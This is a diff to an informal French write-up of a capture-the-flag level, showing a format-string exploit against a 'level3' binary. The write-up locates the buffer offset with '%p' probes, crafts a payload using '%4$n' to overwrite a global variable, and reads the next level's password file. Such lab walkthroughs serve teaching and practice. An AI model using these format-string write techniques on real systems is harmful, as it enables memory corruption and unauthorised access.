@@ -32,14 +32,21 @@ Dump of assembler code for function v:
 Nous remarquons que le retour de printf (rax) est remplacé par ce qui se trouve a 0x804988c,
 et que le format est fournis par... l'utilisateur lors du fgets.
 
+
+deja on va trover q auelle offset se trouver notre buffer sur la stack:
+python -c "print 'AAAA' + '%p '*10" | ./level3
+AAAA0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520
+on voie que les 0x41414141 se trouve au 4eme offfset
+
+
+
 On va donc remplacer ce qui se trouve a 0x804988c par notre propre sauce:
 
 python -c "print('\x08\x04\x98\x8c'[::-1] + '%60p' + '%4\$n')" > /tmp/lvl3
 
-donc on met 0x804988c au debut du format, on print 64 caracteres et on demande a %n d'ecrire combiens de chars il a fait
+donc on met 0x804988c au debut du format pour qu'il sois pris comme l'adresse ou ecrire les octer,
+on print 64 (- 4 pour l'adresse) caracteres et on demande a %4\$n d'ecrire combiens de chars il a fait
 donc 64 (puisque)    0x080484df <+59>:	cmp    $0x40,%eax
-
-le 4 est la pour l'offset d'ou se trouve le format sur la stack.
 
 cat /tmp/lvl3 - | ./level3
 cat /home/user/level4/.pass
